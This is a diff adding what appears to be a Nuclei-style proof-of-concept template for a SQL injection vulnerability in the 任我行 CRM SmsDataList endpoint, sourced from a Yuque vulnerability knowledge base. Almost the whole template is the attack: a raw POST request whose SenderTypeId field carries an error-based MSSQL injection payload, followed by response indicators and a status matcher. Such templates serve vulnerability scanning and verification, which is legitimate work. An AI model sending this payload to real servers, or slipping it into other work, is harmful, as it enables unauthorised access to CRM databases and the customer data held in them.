@@ -1,0 +1,42 @@
+id: poc-vbp8nadsgflt36df
+info:
+  name: 任我行 CRM SmsDataList SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vbp8nadsgflt36df'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vbp8nadsgflt36df
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /SMS/SmsDataList/?pageIndex=1&pageSize=30 HTTP/1.1
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0000000000''and 1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES(''MD5'',''123456'')))) AND ''CvNI''=''CvNI
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    0xe10
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
